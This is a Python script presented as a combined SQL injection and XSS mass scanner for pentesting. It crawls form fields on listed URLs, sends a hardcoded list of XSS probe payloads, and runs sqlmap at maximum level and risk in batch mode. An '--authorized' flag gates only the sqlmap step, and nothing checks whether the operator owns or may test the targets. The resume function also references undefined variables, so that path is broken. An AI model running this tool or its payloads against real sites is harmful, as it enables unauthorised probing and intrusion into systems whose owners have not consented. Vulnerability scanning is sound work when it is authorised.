#!/usr/bin/env python3

import requests
import subprocess
import argparse
import threading
import json
import logging
import sqlite3
import html
from bs4 import BeautifulSoup
from queue import Queue
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
import uuid
import os
import re
from lxml import html as lxml_html
from tqdm import tqdm

# Global variables
results = []
lock = threading.Lock()

# List of common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<marquee>XSS</marquee>",
    "<blink>XSS</blink>",
    "<base href='http://example.com/' onerror=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<object data='javascript:alert(\"XSS\")'></object>"
]

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

def setup_logging(verbose):
    if verbose:
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        console_handler.setFormatter(formatter)
        logger.addHandler(console_handler)

def get_parameters(url):
    """
    Extract form parameters from the given URL.
    """
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        parameters = []

        for form in forms:
            inputs = form.find_all(['input', 'textarea', 'select'])
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    parameters.append(name)

        return parameters
    except requests.RequestException as e:
        logger.error(f"Error extracting parameters from {url}: {e}")
        return []

def validate_url(url):
    """
    Validate the URL format.
    """
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def generate_sqlmap_command(base_url, param, method, cookies, proxy, blind):
    """
    Generate the sqlmap command without executing it.
    """
    command_parts = ["sqlmap", "-u", base_url, "--level=5", "--risk=3", "--batch", "--random-agent"]
    if cookies:
        command_parts.extend(["--cookie", cookies])
    if proxy:
        command_parts.extend(["--proxy", proxy])
    if method.upper() == 'POST':
        command_parts.extend(["--data", f"{param}=test"])
    if blind:
        command_parts.extend(["--technique=B", "--time-sec=5"])
    return command_parts

def execute_sqlmap_command(command, dry_run):
    """
    Execute the sqlmap command and capture the output.
    """
    if dry_run:
        logger.info(f"Dry run: Would execute {command}")
        return '', ''
    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=60)
        result.check_returncode()
        return result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return '', 'Timeout expired'
    except subprocess.CalledProcessError as e:
        return '', str(e)
    except Exception as e:
        return '', str(e)

def scan_sql_injection(url, param, method, cookies=None, proxy=None, dry_run=False, blind=False):
    """
    Scan a given URL parameter for SQL injection vulnerabilities using sqlmap.
    """
    base_url = url
    if method.upper() == 'GET':
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        query_params[param] = ['test']
        new_query_string = urlencode(query_params, doseq=True)
        base_url = parsed_url._replace(query=new_query_string).geturl()

    command = generate_sqlmap_command(base_url, param, method, cookies, proxy, blind)
    output, error = execute_sqlmap_command(command, dry_run)

    status = 'Unknown'
    if 'VULNERABLE' in output.upper() or 'is vulnerable' in output.lower():
        status = 'Vulnerable'
    elif 'not vulnerable' in output.lower():
        status = 'Not Vulnerable'

    with lock:
        results.append({
            'id': str(uuid.uuid4()),
            'run_id': str(uuid.uuid4()),
            'url': url,
            'parameter': param,
            'type': 'SQL Injection',
            'payload': None,
            'status': status,
            'output': output[:5000],
            'error': error[:5000],
            'http_code': None,
            'duration': None,
            'command': ' '.join(command)
        })

def test_xss(url, param, payload, method='POST', cookies=None, proxy=None):
    """
    Test a given URL parameter for XSS vulnerabilities.
    """
    data = {param: payload}
    try:
        if method.upper() == 'GET':
            response = requests.get(url, params=data, cookies=cookies, proxies={"http": proxy, "https": proxy}, timeout=10)
        else:
            response = requests.post(url, data=data, cookies=cookies, proxies={"http": proxy, "https": proxy}, timeout=10)
        response.raise_for_status()
        escaped_payload = html.unescape(payload)
        tree = lxml_html.fromstring(response.text)
        if tree.xpath(f"//*[contains(text(), '{escaped_payload}')]"):
            with lock:
                results.append({
                    'id': str(uuid.uuid4()),
                    'run_id': str(uuid.uuid4()),
                    'url': url,
                    'parameter': param,
                    'type': 'XSS',
                    'payload': payload,
                    'status': 'Vulnerable',
                    'output': response.text[:5000],
                    'error': None,
                    'http_code': response.status_code,
                    'duration': response.elapsed.total_seconds()
                })
        else:
            with lock:
                results.append({
                    'id': str(uuid.uuid4()),
                    'run_id': str(uuid.uuid4()),
                    'url': url,
                    'parameter': param,
                    'type': 'XSS',
                    'payload': payload,
                    'status': 'Not Vulnerable',
                    'output': response.text[:5000],
                    'error': None,
                    'http_code': response.status_code,
                    'duration': response.elapsed.total_seconds()
                })
    except requests.RequestException as e:
        with lock:
            results.append({
                'id': str(uuid.uuid4()),
                'run_id': str(uuid.uuid4()),
                'url': url,
                'parameter': param,
                'type': 'XSS',
                'payload': payload,
                'status': 'Error',
                'output': None,
                'error': str(e),
                'http_code': None,
                'duration': None
            })

def worker(queue, cookies, proxy, authorized, dry_run, blind):
    """
    Worker function for multithreading.
    """
    while True:
        item = queue.get()
        if item is None:
            break
        url, param, test_type, payload, method = item
        logger.info(f"Scanning param {param} on URL {url} with payload {payload}")
        if test_type == 'SQL Injection':
            if authorized:
                scan_sql_injection(url, param, method, cookies, proxy, dry_run, blind)
        elif test_type == 'XSS':
            test_xss(url, param, payload, method, cookies, proxy)
        queue.task_done()

def generate_report(results, output_file):
    """
    Generate a report from the scan results.
    """
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=4)

def generate_html_report(results, output_file):
    """
    Generate an HTML report from the scan results.
    """
    html_content = """
    <html>
    <head><title>Scan Report</title><style>
    table { width: 100%; border-collapse: collapse; }
    th, td { border: 1px solid black; padding: 8px; text-align: left; }
    tr.vulnerable { background-color: #ffdddd; }
    tr.not-vulnerable { background-color: #ddffdd; }
    </style></head>
    <body>
    <h1>Scan Report</h1>
    <p>Generated on: {date}</p>
    <table border="1">
    <tr><th>ID</th><th>Run ID</th><th>URL</th><th>Parameter</th><th>Type</th><th>Status</th><th>Payload</th><th>HTTP Code</th><th>Duration (s)</th><th>Output</th><th>Error</th></tr>
    """.format(date=datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

    for result in results:
        row_class = 'vulnerable' if result.get('status') == 'Vulnerable' else 'not-vulnerable'
        html_content += """
        <tr class="{row_class}">
        <td>{id}</td>
        <td>{run_id}</td>
        <td>{url}</td>
        <td>{parameter}</td>
        <td>{type}</td>
        <td>{status}</td>
        <td>{payload}</td>
        <td>{http_code}</td>
        <td>{duration}</td>
        <td>{output}</td>
        <td>{error}</td>
        </tr>
        """.format(
            row_class=row_class,
            id=html.escape(result.get('id', '')),
            run_id=html.escape(result.get('run_id', '')),
            url=html.escape(result.get('url', '')),
            parameter=html.escape(result.get('parameter', '')),
            type=html.escape(result.get('type', '')),
            status=html.escape(result.get('status', '')),
            payload=html.escape(result.get('payload', '')),
            http_code=result.get('http_code', ''),
            duration=result.get('duration', ''),
            output=html.escape(result.get('output', '').replace('\n', '<br>')),
            error=html.escape(result.get('error', '').replace('\n', '<br>'))
        )

    html_content += "</table></body></html>"

    with open(output_file, 'w') as f:
        f.write(html_content)

def read_urls_from_file(file_path):
    """
    Read URLs from a file.
    """
    with open(file_path, 'r') as f:
        urls = f.readlines()
    return [url.strip() for url in urls]

def load_config(config_file):
    """
    Load configuration from a JSON file.
    """
    with open(config_file, 'r') as f:
        config = json.load(f)
    return config

def save_to_database(results, db_file):
    """
    Save scan results to a SQLite database.
    """
    conn = sqlite3.connect(db_file)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS results
                 (id TEXT PRIMARY KEY, run_id TEXT, url TEXT, parameter TEXT, type TEXT, status TEXT, payload TEXT, http_code INTEGER, duration REAL, output TEXT, error TEXT, command TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')

    for result in results:
        c.execute('''INSERT INTO results (id, run_id, url, parameter, type, status, payload, http_code, duration, output, error, command)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
            result.get('id'),
            result.get('run_id'),
            result.get('url'),
            result.get('parameter'),
            result.get('type'),
            result.get('status'),
            result.get('payload'),
            result.get('http_code'),
            result.get('duration'),
            result.get('output', '')[:5000],
            result.get('error', '')[:5000],
            result.get('command')
        ))

    conn.commit()
    conn.close()

def resume_scan(db_file, urls, config):
    """
    Resume a scan from the database.
    """
    conn = sqlite3.connect(db_file)
    c = conn.cursor()
    c.execute('''SELECT url, parameter, type FROM results''')
    scanned_items = c.fetchall()
    conn.close()

    scanned_set = set((url, param, test_type) for url, param, test_type in scanned_items)

    queue = Queue()
    for url in urls:
        if auto_params:
            parameters = get_parameters(url)
        else:
            parameters = input(f"Enter the parameters to scan for {url} (comma separated): ").split(',')

        # Remove any extra spaces from parameters
        parameters = [param.strip() for param in parameters]

        for param in parameters:
            for method in methods:
                if 'SQL Injection' in scan_types and (url, param, 'SQL Injection') not in scanned_set:
                    queue.put((url, param, 'SQL Injection', None, method))
                if 'XSS' in scan_types and (url, param, 'XSS') not in scanned_set:
                    for payload in xss_payloads:
                        queue.put((url, param, 'XSS', payload, method))

    return queue

def main():
    """
    Main function to start the combined scanner.
    """
    parser = argparse.ArgumentParser(description="Advanced Combined SQL Injection and XSS Scanner for Mass Scanning and Pentesting")
    parser.add_argument("input_file", help="File containing URLs to scan, one per line")
    parser.add_argument("--config", help="Configuration file in JSON format", default='config.json')
    parser.add_argument("--report", help="Generate a report and save it to a file", default=None)
    parser.add_argument("--html-report", help="Generate an HTML report and save it to a file", default=None)
    parser.add_argument("--db", help="Save results to a SQLite database", default=None)
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("--authorized", action="store_true", help="Authorize the execution of external tools")
    parser.add_argument("--dry-run", action="store_true", help="Generate commands only, do not execute")
    parser.add_argument("--output-dir", help="Directory to save all reports", default=None)
    parser.add_argument("--resume", action="store_true", help="Resume scan from the database")
    parser.add_argument("--all-methods", action="store_true", help="Test both GET and POST methods")
    parser.add_argument("--blind", action="store_true", help="Enable blind SQL injection technique")

    args = parser.parse_args()

    # Load configuration
    config = load_config(args.config)
    cookies = config.get('cookies')
    proxy = config.get('proxy')
    auto_params = config.get('auto_params', False)
    threads = config.get('threads', 5)
    scan_types = config.get('scan_types', ['SQL Injection', 'XSS'])
    methods = config.get('methods', ['POST', 'GET'])

    if args.all_methods:
        methods = ['GET', 'POST']

    if args.verbose:
        setup_logging(args.verbose)

    urls = read_urls_from_file(args.input_file)

    # Validate URLs
    valid_urls = [url for url in urls if validate_url(url)]
    if len(valid_urls) != len(urls):
        logger.warning(f"Invalid URLs found and removed: {set(urls) - set(valid_urls)}")

    if args.resume and args.db:
        queue = resume_scan(args.db, valid_urls, config)
    else:
        # Create a queue and add parameters to it
        queue = Queue()
        for url in valid_urls:
            if auto_params:
                parameters = get_parameters(url)
            else:
                parameters = input(f"Enter the parameters to scan for {url} (comma separated): ").split(',')

            # Remove any extra spaces from parameters
            parameters = [param.strip() for param in parameters]

            for param in parameters:
                for method in methods:
                    if 'SQL Injection' in scan_types:
                        queue.put((url, param, 'SQL Injection', None, method))
                    if 'XSS' in scan_types:
                        for payload in xss_payloads:
                            queue.put((url, param, 'XSS', payload, method))

    # Create and start threads
    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=worker, args=(queue, cookies, proxy, args.authorized, args.dry_run, args.blind))
        thread.start()
        threads_list.append(thread)

    # Wait for all threads to complete
    queue.join()
    for _ in range(threads):
        queue.put(None)
    for thread in threads_list:
        thread.join()

    # Generate report if specified
    if args.report:
        if args.output_dir:
            os.makedirs(args.output_dir, exist_ok=True)
            report_path = os.path.join(args.output_dir, 'report.json')
        else:
            report_path = args.report
        generate_report(results, report_path)
        logger.info(f"Report generated: {report_path}")

    if args.html_report:
        if args.output_dir:
            os.makedirs(args.output_dir, exist_ok=True)
            html_report_path = os.path.join(args.output_dir, 'report.html')
        else:
            html_report_path = args.html_report
        generate_html_report(results, html_report_path)
        logger.info(f"HTML Report generated: {html_report_path}")

    if args.db:
        save_to_database(results, args.db)
        logger.info(f"Results saved to database: {args.db}")

if __name__ == "__main__":
    main()
